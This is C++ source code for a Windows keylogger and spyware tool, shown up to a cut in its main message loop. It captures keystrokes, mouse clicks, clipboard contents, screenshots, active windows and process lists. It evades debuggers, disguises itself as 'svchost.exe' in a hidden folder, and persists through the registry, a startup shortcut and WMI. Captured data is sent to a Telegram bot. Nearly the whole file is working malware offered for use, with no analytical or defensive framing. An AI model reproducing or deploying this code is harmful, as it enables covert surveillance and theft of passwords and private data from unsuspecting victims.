#define UNICODE
#include <windows.h>
#include <iostream>
#include <fstream>
#include <windows.h>
#include <winhttp.h>
#include <shlobj.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#include <psapi.h>
#include <thread>
#include <vector>
#include <mutex>
#include <atomic>
#include <fstream>
#include <sstream>
#include <iomanip>
#include <random>
#include <algorithm>
#include <functional>
#include <memory>
#include <chrono>
#include <ctime>
#include <cwchar>
#include <comdef.h>
#include <Wbemidl.h>
#include <iphlpapi.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "iphlpapi.lib")

using namespace std;
using namespace std::chrono;

// ===== Configuration =====
const wchar_t* BOT_TOKEN = L"YOUR_BOT_TOKEN_HERE";
const wchar_t* CHAT_ID = L"YOUR_CHAT_ID_HERE";

const wchar_t* LOG_FILE_NAME = L"system_log.dat";
const wchar_t* APPDATA_FOLDER = L"Microsoft\\Windows\\System32\\dllcache";
const wchar_t* EXE_NAME = L"svchost.exe";
const size_t MAX_LOG_SIZE = 1024 * 100; // 100KB

// ===== Encryption Settings =====
const size_t AES_KEY_SIZE = 256;
const size_t AES_BLOCK_SIZE = 16;

// ===== Timing Intervals =====
const auto CLIPBOARD_CHECK_INTERVAL = 5s;
const auto SCREENSHOT_INTERVAL = 60s;
const auto SEND_INTERVAL = 120s;
const auto PROCESS_CHECK_INTERVAL = 30s;
const auto ANTI_DEBUG_CHECK_INTERVAL = 15s;

// ===== Global Variables =====
atomic<bool> g_running(true);
mutex g_logMutex;
vector<wchar_t> g_logBuffer;
HCRYPTPROV hCryptProv = 0;
HCRYPTKEY hKey = 0;

// ===== Anti-Debug Techniques =====
class AntiDebug {
public:
    static bool IsDebuggerPresent() {
        return ::IsDebuggerPresent();
    }

    static bool CheckRemoteDebugger() {
        BOOL isDebugged = FALSE;
        CheckRemoteDebuggerPresent(GetCurrentProcess(), &isDebugged);
        return isDebugged;
    }

    static bool CheckPEB() {
        bool isDebugged = false;
        #ifdef _MSC_VER
        __asm {
            mov eax, fs:[0x30]
            mov al, [eax+0x02]
            and al, 0xFF
            mov isDebugged, al
        }
        #else
        asm volatile (
            "mov %%fs:0x30, %%eax\n"
            "mov 0x02(%%eax), %%al\n"
            "and $0xFF, %%al\n"
            : "=a" (isDebugged)
            :
            :
        );
        #endif
        return isDebugged;
    }

    static bool CheckHeapFlags() {
        PVOID pHeapBase = GetProcessHeap();
        PDWORD pHeapFlags = (PDWORD)((PBYTE)pHeapBase + 0x70);
        PDWORD pHeapForceFlags = (PDWORD)((PBYTE)pHeapBase + 0x74);
        return (*pHeapFlags & ~HEAP_GROWABLE) || (*pHeapForceFlags != 0);
    }

    static bool CheckNTGlobalFlag() {
        PDWORD pNtGlobalFlag = (PDWORD)(__readgsqword(0x60) + 0xBC);
        return (*pNtGlobalFlag & 0x70) != 0;
    }

    static bool RunChecks() {
        if (IsDebuggerPresent() || CheckRemoteDebugger() || 
            CheckPEB() || CheckHeapFlags() || CheckNTGlobalFlag()) {
            ExitProcess(0);
            return true;
        }
        return false;
    }
};

// ===== Polymorphic Code Engine =====
class PolymorphicEngine {
private:
    mt19937 rng;
    uniform_int_distribution<int> dist;

public:
    PolymorphicEngine() : rng(random_device{}()), dist(0, 255) {}

    void EncryptDecrypt(vector<BYTE>& data) {
        for (auto& byte : data) {
            byte ^= dist(rng);
        }
    }

    wstring GenerateRandomString(size_t length) {
        wstring result;
        for (size_t i = 0; i < length; ++i) {
            result += static_cast<wchar_t>(dist(rng));
        }
        return result;
    }

    void ObfuscateMemory(void* ptr, size_t size) {
        vector<BYTE> temp(size);
        memcpy(temp.data(), ptr, size);
        EncryptDecrypt(temp);
        memcpy(ptr, temp.data(), size);
    }
};

// ===== Advanced Encryption =====
class CryptoManager {
private:
    HCRYPTPROV hProv;
    HCRYPTKEY hKey;
    PolymorphicEngine polyEngine;

public:
    CryptoManager() : hProv(0), hKey(0) {
        if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
            throw runtime_error("Failed to acquire crypto context");
        }

        vector<BYTE> key(AES_KEY_SIZE / 8);
        HCRYPTHASH hHash = 0;

        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
            CryptReleaseContext(hProv, 0);
            throw runtime_error("Failed to create hash");
        }

        wstring password = L"ComplexDynamicPassword@" + to_wstring(GetCurrentProcessId());
        if (!CryptHashData(hHash, (BYTE*)password.c_str(), (DWORD)(password.size() * sizeof(wchar_t)), 0)) {
            CryptDestroyHash(hHash);
            CryptReleaseContext(hProv, 0);
            throw runtime_error("Failed to hash data");
        }

        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
            CryptDestroyHash(hHash);
            CryptReleaseContext(hProv, 0);
            throw runtime_error("Failed to derive key");
        }

        CryptDestroyHash(hHash);
        polyEngine.ObfuscateMemory(&hKey, sizeof(hKey));
    }

    ~CryptoManager() {
        polyEngine.ObfuscateMemory(&hKey, sizeof(hKey));
        if (hKey) CryptDestroyKey(hKey);
        if (hProv) CryptReleaseContext(hProv, 0);
    }

    void Encrypt(vector<BYTE>& data) {
        polyEngine.ObfuscateMemory(data.data(), data.size());
        DWORD dwLen = (DWORD)data.size();
        if (!CryptEncrypt(hKey, 0, TRUE, 0, data.data(), &dwLen, (DWORD)data.size())) {
            throw runtime_error("Encryption failed");
        }
    }

    void Decrypt(vector<BYTE>& data) {
        DWORD dwLen = (DWORD)data.size();
        if (!CryptDecrypt(hKey, 0, TRUE, 0, data.data(), &dwLen)) {
            throw runtime_error("Decryption failed");
        }
        polyEngine.ObfuscateMemory(data.data(), data.size());
    }
};

// ===== System Information =====
class SystemInfo {
public:
    static wstring GetMACAddress() {
        PIP_ADAPTER_INFO pAdapterInfo;
        PIP_ADAPTER_INFO pAdapter = NULL;
        DWORD dwRetVal = 0;
        ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);

        pAdapterInfo = (IP_ADAPTER_INFO*)malloc(sizeof(IP_ADAPTER_INFO));
        if (pAdapterInfo == NULL) {
            return L"";
        }

        if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
            free(pAdapterInfo);
            pAdapterInfo = (IP_ADAPTER_INFO*)malloc(ulOutBufLen);
            if (pAdapterInfo == NULL) {
                return L"";
            }
        }

        wstringstream macStream;
        if ((dwRetVal = GetAdaptersInfo(pAdapterInfo, &ulOutBufLen)) == NO_ERROR) {
            pAdapter = pAdapterInfo;
            while (pAdapter) {
                if (pAdapter->AddressLength == 6) {
                    for (UINT i = 0; i < pAdapter->AddressLength; i++) {
                        macStream << hex << setw(2) << setfill(L'0') 
                                 << (int)pAdapter->Address[i];
                        if (i < pAdapter->AddressLength - 1) {
                            macStream << L":";
                        }
                    }
                    break;
                }
                pAdapter = pAdapter->Next;
            }
        }

        free(pAdapterInfo);
        return macStream.str();
    }

    static wstring GetHWID() {
        HW_PROFILE_INFOW hwProfileInfo;
        if (!GetCurrentHwProfileW(&hwProfileInfo)) {
            return L"";
        }
        return hwProfileInfo.szHwProfileGuid;
    }

    static wstring GetOSVersion() {
        wstring version;
        NTSTATUS(WINAPI *RtlGetVersion)(LPOSVERSIONINFOEXW);
        OSVERSIONINFOEXW osInfo;

        *(FARPROC*)&RtlGetVersion = GetProcAddress(GetModuleHandleA("ntdll"), "RtlGetVersion");

        if (RtlGetVersion != nullptr) {
            osInfo.dwOSVersionInfoSize = sizeof(osInfo);
            RtlGetVersion(&osInfo);

            wstringstream ss;
            ss << osInfo.dwMajorVersion << L"." << osInfo.dwMinorVersion 
               << L"." << osInfo.dwBuildNumber;
            version = ss.str();
        }

        return version;
    }
};

// ===== File System Stealth =====
class FileManager {
private:
    wstring appDataPath;
    CryptoManager crypto;

public:
    FileManager() {
        wchar_t path[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, path))) {
            appDataPath = path;
            appDataPath += L"\\";
            appDataPath += APPDATA_FOLDER;
            CreateDirectoryW(appDataPath.c_str(), NULL);
            SetFileAttributesW(appDataPath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        }
    }

    wstring GetLogFilePath() const {
        return appDataPath + L"\\" + LOG_FILE_NAME;
    }

    wstring GetScreenshotPath() const {
        auto now = system_clock::now();
        auto in_time_t = system_clock::to_time_t(now);
        wstringstream ss;
        ss << appDataPath << L"\\screen_" << put_time(localtime(&in_time_t), L"%Y%m%d_%H%M%S") << L".bmp";
        return ss.str();
    }

    wstring GetExePath() const {
        return appDataPath + L"\\" + EXE_NAME;
    }

    void WriteLog(const vector<wchar_t>& data) {
        if (data.empty()) return;

        vector<BYTE> byteData(data.size() * sizeof(wchar_t));
        memcpy(byteData.data(), data.data(), byteData.size());

        crypto.Encrypt(byteData);

        lock_guard<mutex> lock(g_logMutex);
        wofstream file(GetLogFilePath().c_str(), ios::binary | ios::app);
        if (file.is_open()) {
            file.write(reinterpret_cast<const wchar_t*>(byteData.data()), byteData.size() / sizeof(wchar_t));
            file.close();
        }
    }

    vector<wchar_t> ReadLog() {
        lock_guard<mutex> lock(g_logMutex);
        wifstream file(GetLogFilePath().c_str(), ios::binary | ios::ate);
        if (!file.is_open()) return {};

        streamsize size = file.tellg();
        file.seekg(0, ios::beg);

        vector<BYTE> byteData(size);
        if (file.read(reinterpret_cast<wchar_t*>(byteData.data()), size / sizeof(wchar_t))) {
            crypto.Decrypt(byteData);
            vector<wchar_t> result(byteData.size() / sizeof(wchar_t));
            memcpy(result.data(), byteData.data(), byteData.size());
            file.close();
            return result;
        }
        file.close();
        return {};
    }

    void DeleteLog() {
        lock_guard<mutex> lock(g_logMutex);
        DeleteFileW(GetLogFilePath().c_str());
    }
};

// ===== Persistence Mechanisms =====
class PersistenceManager {
private:
    FileManager files;

public:
    void Install() {
        CopySelf();
        AddToRegistry();
        AddToStartupFolder();
        AddToWMI();
    }

private:
    void CopySelf() {
        wchar_t srcPath[MAX_PATH];
        GetModuleFileNameW(NULL, srcPath, MAX_PATH);

        if (GetFileAttributesW(files.GetExePath().c_str()) == INVALID_FILE_ATTRIBUTES) {
            CopyFileW(srcPath, files.GetExePath().c_str(), FALSE);
            SetFileAttributesW(files.GetExePath().c_str(), 
                             FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        }
    }

    void AddToRegistry() {
        HKEY hKey;
        if (RegOpenKeyExW(HKEY_CURRENT_USER, 
                         L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                         0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            RegSetValueExW(hKey, L"WindowsSystemService", 0, REG_SZ, 
                          (const BYTE*)files.GetExePath().c_str(), 
                          (DWORD)(files.GetExePath().size() + 1) * sizeof(wchar_t));
            RegCloseKey(hKey);
        }
    }

    void AddToStartupFolder() {
        wchar_t startupPath[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, startupPath))) {
            wstring shortcutPath = startupPath;
            shortcutPath += L"\\SystemHelper.lnk";

            if (GetFileAttributesW(shortcutPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
                CreateShortcut(files.GetExePath(), shortcutPath);
            }
        }
    }

    void AddToWMI() {
        HRESULT hres;
        IWbemLocator* pLoc = NULL;
        IWbemServices* pSvc = NULL;

        hres = CoInitializeEx(0, COINIT_MULTITHREADED);
        hres = CoInitializeSecurity(
            NULL,
            -1,
            NULL,
            NULL,
            RPC_C_AUTHN_LEVEL_DEFAULT,
            RPC_C_IMP_LEVEL_IMPERSONATE,
            NULL,
            EOAC_NONE,
            NULL
        );

        hres = CoCreateInstance(
            CLSID_WbemLocator,
            0,
            CLSCTX_INPROC_SERVER,
            IID_IWbemLocator,
            (LPVOID*)&pLoc
        );

        hres = pLoc->ConnectServer(
            _bstr_t(L"ROOT\\CIMV2"),
            NULL,
            NULL,
            NULL,
            0,
            NULL,
            NULL,
            &pSvc
        );

        hres = CoSetProxyBlanket(
            pSvc,
            RPC_C_AUTHN_WINNT,
            RPC_C_AUTHZ_NONE,
            NULL,
            RPC_C_AUTHN_LEVEL_CALL,
            RPC_C_IMP_LEVEL_IMPERSONATE,
            NULL,
            EOAC_NONE
        );

        IWbemClassObject* pClass = NULL;
        hres = pSvc->GetObject(_bstr_t(L"Win32_StartupCommand"), 0, NULL, &pClass, NULL);

        IWbemClassObject* pInParamsDefinition = NULL;
        IWbemClassObject* pClassInstance = NULL;
        hres = pClass->GetMethod(_bstr_t(L"Create"), 0, &pInParamsDefinition, NULL);

        hres = pInParamsDefinition->SpawnInstance(0, &pClassInstance);

        VARIANT varCommand;
        VariantInit(&varCommand);
        varCommand.vt = VT_BSTR;
        varCommand.bstrVal = _bstr_t(files.GetExePath().c_str());
        hres = pClassInstance->Put(L"Command", 0, &varCommand, 0);
        VariantClear(&varCommand);

        VARIANT varLocation;
        VariantInit(&varLocation);
        varLocation.vt = VT_BSTR;
        varLocation.bstrVal = _bstr_t(L"WMI Startup");
        hres = pClassInstance->Put(L"Location", 0, &varLocation, 0);
        VariantClear(&varLocation);

        IWbemClassObject* pOutParams = NULL;
        hres = pSvc->ExecMethod(
            _bstr_t(L"Win32_StartupCommand"),
            _bstr_t(L"Create"),
            0,
            NULL,
            pClassInstance,
            &pOutParams,
            NULL
        );

        if (pOutParams) pOutParams->Release();
        if (pClassInstance) pClassInstance->Release();
        if (pInParamsDefinition) pInParamsDefinition->Release();
        if (pClass) pClass->Release();
        if (pSvc) pSvc->Release();
        if (pLoc) pLoc->Release();
        CoUninitialize();
    }

    void CreateShortcut(const wstring& targetPath, const wstring& shortcutPath) {
        HRESULT hres;
        IShellLinkW* pShellLink = NULL;
        IPersistFile* pPersistFile = NULL;

        hres = CoCreateInstance(CLSID_ShellLink, NULL, 
                              CLSCTX_INPROC_SERVER, IID_IShellLinkW, 
                              (void**)&pShellLink);

        if (SUCCEEDED(hres)) {
            pShellLink->SetPath(targetPath.c_str());
            pShellLink->SetDescription(L"System Helper Service");
            pShellLink->SetShowCmd(SW_HIDE);

            hres = pShellLink->QueryInterface(IID_IPersistFile, (void**)&pPersistFile);
            if (SUCCEEDED(hres)) {
                hres = pPersistFile->Save(shortcutPath.c_str(), TRUE);
                pPersistFile->Release();
            }
            pShellLink->Release();
        }
    }
};

// ===== Network Communication =====
class TelegramCommunicator {
private:
    wstring botToken;
    wstring chatId;

public:
    TelegramCommunicator(const wstring& token, const wstring& id) 
        : botToken(token), chatId(id) {}

    bool SendMessage(const wstring& message) {
        HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT)",
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            WINHTTP_NO_PROXY_NAME,
            WINHTTP_NO_PROXY_BYPASS, 0);

        if (!hSession) return false;

        HINTERNET hConnect = WinHttpConnect(hSession, L"api.telegram.org", 
                                          INTERNET_DEFAULT_HTTPS_PORT, 0);
        if (!hConnect) {
            WinHttpCloseHandle(hSession);
            return false;
        }

        wstring path = L"/bot" + botToken + L"/sendMessage";
        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", path.c_str(),
                                              NULL, WINHTTP_NO_REFERER,
                                              WINHTTP_DEFAULT_ACCEPT_TYPES,
                                              WINHTTP_FLAG_SECURE);

        if (!hRequest) {
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return false;
        }

        wstring postData = L"chat_id=" + chatId + L"&text=" + message;
        BOOL sendResult = WinHttpSendRequest(hRequest,
            L"Content-Type: application/x-www-form-urlencoded",
            -1,
            (LPVOID)postData.c_str(),
            (DWORD)postData.size() * sizeof(wchar_t),
            (DWORD)postData.size() * sizeof(wchar_t),
            0);

        if (!sendResult) {
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return false;
        }

        if (!WinHttpReceiveResponse(hRequest, NULL)) {
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return false;
        }

        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return true;
    }

    bool SendFile(const wstring& filePath) {
        // Implementation for sending files would be similar but with multipart form data
        return false;
    }
};

// ===== Keylogger Core =====
class Keylogger {
private:
    HHOOK keyboardHook;
    HHOOK mouseHook;
    FileManager files;
    TelegramCommunicator telegram;
    atomic<bool> shiftPressed;
    atomic<bool> capsLockOn;

public:
    Keylogger(const wstring& botToken, const wstring& chatId)
        : telegram(botToken, chatId), shiftPressed(false), capsLockOn(false) {
        keyboardHook = NULL;
        mouseHook = NULL;
    }

    ~Keylogger() {
        UnhookWindowsHookEx(keyboardHook);
        UnhookWindowsHookEx(mouseHook);
    }

    void Start() {
        keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
        mouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseProc, NULL, 0);
    }

    static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
        if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
            KBDLLHOOKSTRUCT* kbd = (KBDLLHOOKSTRUCT*)lParam;
            DWORD vkCode = kbd->vkCode;

            Keylogger* logger = reinterpret_cast<Keylogger*>(GetWindowLongPtr(GetDesktopWindow(), GWLP_USERDATA));
            if (logger) {
                logger->ProcessKey(vkCode);
            }
        }
        return CallNextHookEx(NULL, nCode, wParam, lParam);
    }

    static LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam) {
        if (nCode == HC_ACTION) {
            MSLLHOOKSTRUCT* mouseInfo = (MSLLHOOKSTRUCT*)lParam;
            
            Keylogger* logger = reinterpret_cast<Keylogger*>(GetWindowLongPtr(GetDesktopWindow(), GWLP_USERDATA));
            if (logger) {
                logger->ProcessMouse(wParam, mouseInfo->pt.x, mouseInfo->pt.y);
            }
        }
        return CallNextHookEx(NULL, nCode, wParam, lParam);
    }

    void ProcessKey(DWORD vkCode) {
        shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
        capsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

        wchar_t ch = VkToChar(vkCode, shiftPressed, capsLockOn);
        wstring buffer;

        if (ch) {
            buffer += ch;
        }
        else {
            switch (vkCode) {
            case VK_RETURN: buffer = L"[ENTER]"; break;
            case VK_BACK: buffer = L"[BACKSPACE]"; break;
            case VK_TAB: buffer = L"[TAB]"; break;
            case VK_ESCAPE: buffer = L"[ESC]"; break;
            case VK_SPACE: buffer = L" "; break;
            case VK_DELETE: buffer = L"[DEL]"; break;
            case VK_LEFT: buffer = L"[LEFT]"; break;
            case VK_RIGHT: buffer = L"[RIGHT]"; break;
            case VK_UP: buffer = L"[UP]"; break;
            case VK_DOWN: buffer = L"[DOWN]"; break;
            default:
                wchar_t code[16];
                swprintf_s(code, L"[0x%02X]", vkCode);
                buffer = code;
                break;
            }
        }

        AddToLog(buffer);
    }

    void ProcessMouse(UINT message, int x, int y) {
        wstring buffer;
        switch (message) {
        case WM_LBUTTONDOWN:
            buffer = L"[MOUSE: LEFT CLICK at (" + to_wstring(x) + L"," + to_wstring(y) + L")]";
            break;
        case WM_RBUTTONDOWN:
            buffer = L"[MOUSE: RIGHT CLICK at (" + to_wstring(x) + L"," + to_wstring(y) + L")]";
            break;
        case WM_MOUSEWHEEL:
            buffer = L"[MOUSE: WHEEL at (" + to_wstring(x) + L"," + to_wstring(y) + L")]";
            break;
        default:
            return;
        }

        AddToLog(buffer);
    }

    wchar_t VkToChar(DWORD vkCode, bool shift, bool caps) {
        BYTE keyboardState[256] = {0};
        if (shift) keyboardState[VK_SHIFT] = 0x80;
        if (caps) keyboardState[VK_CAPITAL] = 0x01;

        wchar_t output = 0;
        UINT scanCode = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);

        int res = ToUnicode(vkCode, scanCode, keyboardState, &output, 1, 0);
        if (res == 1) {
            return output;
        }
        return 0;
    }

    void AddToLog(const wstring& text) {
        lock_guard<mutex> lock(g_logMutex);
        if (g_logBuffer.size() + text.size() < MAX_LOG_SIZE) {
            g_logBuffer.insert(g_logBuffer.end(), text.begin(), text.end());
        }
    }
};

// ===== Clipboard Monitor =====
class ClipboardMonitor {
private:
    wstring previousClipboard;

public:
    void CheckClipboard() {
        if (!OpenClipboard(NULL)) return;

        HANDLE hData = GetClipboardData(CF_UNICODETEXT);
        if (hData) {
            wchar_t* clipboardText = (wchar_t*)GlobalLock(hData);
            if (clipboardText) {
                if (wcscmp(clipboardText, previousClipboard.c_str()) != 0) {
                    wstring logLine = L"\n[CLIPBOARD] " + wstring(clipboardText) + L"\n";
                    
                    lock_guard<mutex> lock(g_logMutex);
                    if (g_logBuffer.size() + logLine.size() < MAX_LOG_SIZE) {
                        g_logBuffer.insert(g_logBuffer.end(), logLine.begin(), logLine.end());
                    }

                    previousClipboard = clipboardText;
                }
                GlobalUnlock(hData);
            }
        }
        CloseClipboard();
    }
};

// ===== Screenshot Capture =====
class ScreenshotCapturer {
private:
    FileManager files;

public:
    bool Capture() {
        int width = GetSystemMetrics(SM_CXSCREEN);
        int height = GetSystemMetrics(SM_CYSCREEN);

        HDC hScreen = GetDC(NULL);
        HDC hMemDC = CreateCompatibleDC(hScreen);
        HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, width, height);
        HBITMAP hOld = (HBITMAP)SelectObject(hMemDC, hBitmap);

        BitBlt(hMemDC, 0, 0, width, height, hScreen, 0, 0, SRCCOPY);

        wstring filePath = files.GetScreenshotPath();
        bool result = SaveBitmapToFile(hBitmap, filePath);

        SelectObject(hMemDC, hOld);
        DeleteObject(hBitmap);
        DeleteDC(hMemDC);
        ReleaseDC(NULL, hScreen);

        return result;
    }

private:
    bool SaveBitmapToFile(HBITMAP hBitmap, const wstring& filePath) {
        BITMAP bmp;
        PBITMAPINFO pbmi;
        WORD cClrBits;

        if (!GetObject(hBitmap, sizeof(BITMAP), (LPSTR)&bmp)) return false;

        cClrBits = (WORD)(bmp.bmPlanes * bmp.bmBitsPixel);
        if (cClrBits == 1) cClrBits = 1;
        else if (cClrBits <= 4) cClrBits = 4;
        else if (cClrBits <= 8) cClrBits = 8;
        else if (cClrBits <= 16) cClrBits = 16;
        else if (cClrBits <= 24) cClrBits = 24;
        else cClrBits = 32;

        if (cClrBits != 24) {
            pbmi = (PBITMAPINFO)LocalAlloc(LPTR, sizeof(BITMAPINFOHEADER) + sizeof(RGBQUAD) * (1 << cClrBits));
        } else {
            pbmi = (PBITMAPINFO)LocalAlloc(LPTR, sizeof(BITMAPINFOHEADER));
        }

        pbmi->bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        pbmi->bmiHeader.biWidth = bmp.bmWidth;
        pbmi->bmiHeader.biHeight = bmp.bmHeight;
        pbmi->bmiHeader.biPlanes = bmp.bmPlanes;
        pbmi->bmiHeader.biBitCount = bmp.bmBitsPixel;
        pbmi->bmiHeader.biCompression = BI_RGB;
        pbmi->bmiHeader.biSizeImage = ((pbmi->bmiHeader.biWidth * cClrBits + 31) & ~31) / 8 * pbmi->bmiHeader.biHeight;
        pbmi->bmiHeader.biXPelsPerMeter = 0;
        pbmi->bmiHeader.biYPelsPerMeter = 0;
        pbmi->bmiHeader.biClrUsed = 0;
        pbmi->bmiHeader.biClrImportant = 0;

        HANDLE hf;
        BITMAPFILEHEADER hdr;
        PBITMAPINFOHEADER pbih = (PBITMAPINFOHEADER)pbmi;
        LPBYTE lpBits;
        DWORD dwTotal;
        BYTE* hp;
        DWORD dwTmp;

        HDC hdc = GetDC(NULL);
        lpBits = (LPBYTE)GlobalAlloc(GMEM_FIXED, pbih->biSizeImage);

        if (!lpBits) {
            LocalFree(pbmi);
            ReleaseDC(NULL, hdc);
            return false;
        }

        if (!GetDIBits(hdc, hBitmap, 0, (WORD)pbih->biHeight, lpBits, pbmi, DIB_RGB_COLORS)) {
            GlobalFree(lpBits);
            LocalFree(pbmi);
            ReleaseDC(NULL, hdc);
            return false;
        }

        hf = CreateFileW(filePath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hf == INVALID_HANDLE_VALUE) {
            GlobalFree(lpBits);
            LocalFree(pbmi);
            ReleaseDC(NULL, hdc);
            return false;
        }

        hdr.bfType = 0x4d42;
        hdr.bfSize = (DWORD)(sizeof(BITMAPFILEHEADER) + pbih->biSize + pbih->biSizeImage);
        hdr.bfReserved1 = 0;
        hdr.bfReserved2 = 0;
        hdr.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + pbih->biSize;

        if (!WriteFile(hf, (LPVOID)&hdr, sizeof(BITMAPFILEHEADER), &dwTmp, NULL)) {
            CloseHandle(hf);
            GlobalFree(lpBits);
            LocalFree(pbmi);
            ReleaseDC(NULL, hdc);
            return false;
        }

        if (!WriteFile(hf, (LPVOID)pbih, sizeof(BITMAPINFOHEADER), &dwTmp, NULL)) {
            CloseHandle(hf);
            GlobalFree(lpBits);
            LocalFree(pbmi);
            ReleaseDC(NULL, hdc);
            return false;
        }

        dwTotal = pbih->biSizeImage;
        hp = lpBits;
        if (!WriteFile(hf, (LPSTR)hp, (int)dwTotal, &dwTmp, NULL)) {
            CloseHandle(hf);
            GlobalFree(lpBits);
            LocalFree(pbmi);
            ReleaseDC(NULL, hdc);
            return false;
        }

        CloseHandle(hf);
        GlobalFree(lpBits);
        LocalFree(pbmi);
        ReleaseDC(NULL, hdc);

        return true;
    }
};

// ===== Process Monitor =====
class ProcessMonitor {
public:
    vector<wstring> GetRunningProcesses() {
        vector<wstring> processes;
        PROCESSENTRY32W pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32W);

        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) return processes;

        if (Process32FirstW(hSnapshot, &pe32)) {
            do {
                processes.push_back(pe32.szExeFile);
            } while (Process32NextW(hSnapshot, &pe32));
        }

        CloseHandle(hSnapshot);
        return processes;
    }

    void LogProcesses() {
        auto processes = GetRunningProcesses();
        wstring logEntry = L"\n[PROCESS LIST]\n";
        
        for (const auto& proc : processes) {
            logEntry += proc + L"\n";
        }
        logEntry += L"[END PROCESS LIST]\n";

        lock_guard<mutex> lock(g_logMutex);
        if (g_logBuffer.size() + logEntry.size() < MAX_LOG_SIZE) {
            g_logBuffer.insert(g_logBuffer.end(), logEntry.begin(), logEntry.end());
        }
    }
};

// ===== Window Monitor =====
class WindowMonitor {
public:
    void LogActiveWindow() {
        HWND hwnd = GetForegroundWindow();
        if (hwnd) {
            wchar_t windowTitle[256];
            GetWindowTextW(hwnd, windowTitle, 256);

            DWORD processId;
            GetWindowThreadProcessId(hwnd, &processId);

            wchar_t processName[MAX_PATH] = L"Unknown";
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
            if (hProcess) {
                GetModuleFileNameExW(hProcess, NULL, processName, MAX_PATH);
                CloseHandle(hProcess);
            }

            wstring windowInfo = L"\n[ACTIVE WINDOW] " + wstring(windowTitle) + L" (" + processName + L")\n";

            lock_guard<mutex> lock(g_logMutex);
            if (g_logBuffer.size() + windowInfo.size() < MAX_LOG_SIZE) {
                g_logBuffer.insert(g_logBuffer.end(), windowInfo.begin(), windowInfo.end());
            }
        }
    }
};

// ===== Main Application =====
class KeyloggerApp {
private:
    Keylogger keylogger;
    ClipboardMonitor clipboardMonitor;
    ScreenshotCapturer screenshotCapturer;
    ProcessMonitor processMonitor;
    WindowMonitor windowMonitor;
    FileManager fileManager;
    TelegramCommunicator telegram;
    thread mainThread;
    atomic<bool> running;

public:
    KeyloggerApp(const wstring& botToken, const wstring& chatId)
        : keylogger(botToken, chatId), telegram(botToken, chatId), running(true) {}

    void Run() {
        // Anti-debug check
        if (AntiDebug::RunChecks()) {
            ExitProcess(0);
        }

        // Persistence
        PersistenceManager persistence;
        persistence.Install();

        // Start keylogger
        keylogger.Start();

        // Main loop
        mainThread = thread([this]() {
            auto lastScreenshot = steady_clock::now();
            auto lastSend = steady_clock::now();
            auto lastProcessCheck = steady_clock::now();
            auto lastWindowCheck = steady_clock::now();
            auto lastClipboardCheck = steady_clock::now();
            auto lastAntiDebugCheck = steady_clock::now();

            while (running) {
                auto now = steady_clock::now();

                // Clipboard check
                if (now - lastClipboardCheck > CLIPBOARD_CHECK_INTERVAL) {
                    clipboardMonitor.CheckClipboard();
                    lastClipboardCheck = now;
                }

                // Screenshot
                if (now - lastScreenshot > SCREENSHOT_INTERVAL) {
                    screenshotCapturer.Capture();
                    lastScreenshot = now;
                }

                // Process check
                if (now - lastProcessCheck > PROCESS_CHECK_INTERVAL) {
                    processMonitor.LogProcesses();
                    lastProcessCheck = now;
                }

                // Window check
                if (now - lastWindowCheck > seconds(5)) {
                    windowMonitor.LogActiveWindow();
                    lastWindowCheck = now;
                }

                // Anti-debug check
                if (now - lastAntiDebugCheck > ANTI_DEBUG_CHECK_INTERVAL) {
                    AntiDebug::RunChecks();
                    lastAntiDebugCheck = now;
                }

                // Send logs
                if (now - lastSend > SEND_INTERVAL) {
                    SendLogs();
                    lastSend = now;
                }

                this_thread::sleep_for(500ms);
            }
        });

        // Message pump
        MSG msg;
        while (GetMessage(&msg, NULL, 0, 0)) {
